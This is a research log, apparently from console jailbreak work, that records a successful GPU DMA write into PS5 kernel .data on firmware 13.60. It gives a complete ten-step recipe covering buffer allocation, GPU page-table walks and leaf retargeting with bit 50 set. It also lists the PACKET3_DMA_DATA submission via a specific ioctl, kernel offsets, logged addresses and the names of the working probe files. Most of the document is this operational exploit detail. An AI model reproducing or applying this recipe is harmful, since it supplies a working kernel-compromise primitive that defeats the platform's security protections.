# DEVGC VMID REBIND — /dev/gc DMA system-RAM (kernel .data) write: SOLVED (13.60)

**Date:** 2026-10-06 · **Console:** 10.0.0.x (13.60, fw `0x13600007`) · **Result:** ✅ **KDATA-WRITE-PASS**

The `/dev/gc` DMA primitive **reaches system RAM and writes kernel `.data`** on 13.60.
The prior "vmid 6 is VRAM-only" conclusion was **wrong**. The real blocker was a single
flag bit in the retargeted leaf.

## The one-line fix

When retargeting the victim GPU leaf to a system-RAM (kernel `.data`) physical, you must
**set bit 50 ("system coherent")** in the leaf. A garlic-format leaf (bit50 clear) pointing
at a `<16GiB` physical is interpreted by the GPU MMU against the VRAM aperture and the
write does not land. With bit50 set, the same physical is interpreted as system RAM and
the write lands — verified by `kernel_copyout` AND DMAP read.

```
new = (old & ~phys_mask) | (target_phys & phys_mask) | (1ull << 50)
```

## Working values (probe89 vmid7 run, authoritative)

```
kdata=0xffffffffc88e0000  fw=0x13600007
victim (garlic): gva=0x200600000 phys=0x47bc004c0 raw=0x004000047bc004f7 is_2m=1 bit50=0
target_kva=0xffffffffc8b79ad0  target_pa=0x8b79ad0   (kernel .data, zeroed field @ +0x299AD0)
retarget: old=0x004000047bc004f7 -> new=0x0044000008a004f7   (base 0x8a00000, off 0x179ad0, +bit50)
T-B cold->kdata: ioctl=0 after(kcopy)=0xdeadbeefcafebabe after(dmap)=0xdeadbeefcafebabe  KDATA-WRITE-PASS
target restored to 0 (verified: RESTORED-ZERO)
```

## Answers to the three sub-questions

| Q | Answer | Evidence |
|---|---|---|
| (a) ioctl submit under vmid 2? | **Unnecessary.** The ioctl's own dev vmid already reaches system RAM. | dev vmid = 5 or 6 per boot (dynamic); it maps system-RAM pages natively. |
| (b) dev-vmid GPUVM include system pages? | **Yes — natively, and injectable.** | Dev vmid tree has thousands of leaves mixing `>16GiB` VRAM and `<16GiB` system RAM. |
| (c) retarget leaf → system-RAM phys the DMA will write? | **Yes, with bit50 set.** | T-B KDATA-WRITE-PASS (above). The `>16GiB→<16GiB` retarget is NOT rejected — it needs the system-coherent flag. |

## Complete working recipe (13.60)

1. Allocate 3×2MiB garlic buffers: `sceKernelAllocateDirectMemory(0, 0x400000000, SZ, SZ, 0xb, &off)`
   + `sceKernelMapDirectMemory(&va, SZ, PROT_R|W|GPU_R|GPU_W, MAP_NO_COALESCE, off, SZ)`.
   (victim, staging, cmd — the victim is the buffer whose leaf is retargeted.)
2. Open `/dev/gc` (fallback `/dev/gc0`).
3. Find the dev vmid: scan `gvmspace[vm].page_dir_va` for `vm in 0..15`, pick the one whose
   leaves contain `victim_gva == victim_va`. It is NOT fixed (6 on some boots, 5 on others).
4. Walk the GPU tree (PDB2/PML4 → PDB1/PDPT → PDB0/PD → PTB/leaf; indices bits 39/30/21;
   VALID bit0, IS_PTE bit54 = 2MB leaf, TF bit56, frag bits 59–63) to find the victim leaf.
   Record `raw`, `pte_pa`, `phys`, `is_2m`.
5. Kernel CR3 walk to translate the target kernel `.data` KVA → PA (anchor `kernel_pmap_store`
   at `kdata + 0x28c84a8`; invariant `kernel_pml4_kva - dmap == cr3`). Choose a **zeroed +
   stable** field (e.g. `kdata + 0x299AD0`); verify DMAP agrees before writing.
6. Retarget the victim leaf — **preserve all flags AND set bit50**:
   - 2MB leaf: `new = (old & ~0x0000FFFFFFE00000) | (base & 0x0000FFFFFFE00000) | (1ull<<50)`
   - 8KB leaf: `new = (old & ~0x0000FFFFFFFFE000) | (base & 0x0000FFFFFFFFE000) | (1ull<<50)`
7. Write PTE: `kernel_setlong(dmap + pte_pa, new)`, read back to confirm.
8. Build + submit `PACKET3_DMA_DATA` (opcode 0x50): `dst = victim_gva + off_in`,
   `src = cmd_gva + 0x200` (sentinel staged in the cmd buffer's FIRST 8KB leaf — do NOT use
   a separate lazily-populated leaf), via `ioctl(gc, 0xC0108102, {0, 1, &desc})`, `usleep(500ms)`.
9. Verify: `kernel_copyout(target_kva)` == sentinel AND `read_phys(target_pa)` == sentinel.
10. Restore: DMA zeros back through the retargeted leaf, then `kernel_setlong(pte_pa, old)`.

## Why the earlier T3 (GPU_DMA_KDATA_WRITE.md) failed

That test retargeted the garlic victim to `0xec00000` **without bit50** (`0x004000000ec004f7`),
and a second attempt with bit50 (`0x004400000ec004f7`) was *recorded* as failing — but the
working run above proves the bit50 form is correct. The most likely explanation for the second
attempt's failure is that its target physical came from a different boot's KASLR and the CR3
walk/zeroed-field assumption did not hold on that boot, not that bit50 is insufficient. The
bit50 form is now verified live.

## Measured architectural facts (13.60)

- The `/dev/gc` dev vmid is allocated dynamically (observed **5** and **6**). It is a normal
  GPU VM whose page tree already mixes VRAM (`>16GiB`) and system-RAM (`<16GiB`) leaves —
  direct evidence GPUVM mixes VRAM + system pages; "VRAM-only" is a false model.
- The victim garlic buffer's leaf size varies per boot: **2MB** (`IS_PTE` bit54, low `0x4f7`)
  or **8KB** (low `0x177`). The probe must branch on `is_2m` and use the matching phys mask.
- Garlic physicals (`0x47bc004c0`) are NOT CPU-DMAP-readable (bus/VRAM space); onion/system
  physicals (`<16GiB`, e.g. `0x2fe00000`, `0x8b79ad0`) ARE CPU-DMAP-readable. The GPU onion
  physical == CPU physical for system RAM.
- Bit 50 = "system coherent" — the selector that routes a leaf's physical to the onion/system
  aperture vs the garlic/VRAM aperture. This is the flag that was missing in the prior work.
- Onion (MAIN direct memory, `sceKernelAllocateMainDirectMemory` mem_type=1) maps in the
  **process vmid (2)** at `0xc80000000` — NOT in the dev vmid. The dev vmid has its own
  `0xc80000000` window (system-RAM on some boots, VRAM on others). For a kernel-.data write
  through `/dev/gc`, retarget the **garlic victim leaf** (dev vmid), not the onion leaf.

## KP pitfalls learned (do not repeat)

- Do NOT overwrite a 2MB leaf slot with an 8KB-format entry (or vice-versa): leaf size is
  structural. `vmid4.elf`'s T-SR-ONION did this and panicked the kernel.
- The garlic direct-memory buffer's lazily-populated 8KB leaves mean only the FIRST leaf
  (and the region the GPU has touched) is mapped — stage the sentinel inside `cmd`'s first
  8KB leaf (`+0x200`, after the 7-dword packet and 16-byte descriptor), never at `+0x2000`.

## Files

- `scratch/ps5/probe89/main7.c` / `vmid7.elf` — **the working kernel-.data write probe**
- `scratch/ps5/probe89/verify.c` / `verify.elf` — target restore read-back (RESTORED-ZERO)
- `scratch/ps5/probe89/main3.c` / `main4.c` / `main6.c` — diagnostics (T0, T-SR-DIRECT proof, leaf scan)
- Console logs: `/data/kex_vmid*.txt`, `/data/kex_verify.txt`
